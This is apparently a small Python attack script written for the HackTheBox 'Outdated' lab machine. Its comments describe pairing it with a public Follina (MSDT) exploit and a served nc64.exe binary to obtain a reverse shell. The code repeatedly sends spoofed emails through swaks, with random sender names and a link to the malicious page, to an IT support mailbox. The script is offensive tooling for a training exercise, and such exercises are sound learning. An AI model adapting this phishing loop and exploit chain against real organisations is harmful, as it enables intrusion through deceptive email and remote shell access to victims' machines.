#Created by SourMilk & ALi3nW3rX to work in conjuction with follin.py on Hackthebox.com's

#Outdated box to get a reverse shell.
#Run the follina.py script from https://github.com/JohnHammond/msdt-follina in terminal 1
#Copy nc64.exe to /tmp/<location from follina>/www/nc64.exe
#Run AlienMilk.py


import time
import subprocess
import random
import string

# Prompt the user for the required arguments
body = input("Enter the body for the email http://<ip>/index.html: ")

# Generate random strings for arg3, arg4, and arg5
arg3 = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
arg4 = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
arg5 = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

while True:
  try:
    # Construct the swaks command using the user-specified and generated arguments
    command = f'swaks --to itsupport@outdated.htb --from {arg3}@{arg4} --server mail.outdated.htb --header "Subject: {arg5}" --body "{body}"'

    # Run the swaks command
    subprocess.run(command, shell=True)

    # Pause for 10 seconds before sending the next email
    time.sleep(10)
  except KeyboardInterrupt:
    # If the user presses CTRL + C, exit the program
    print("Exiting program")
    break
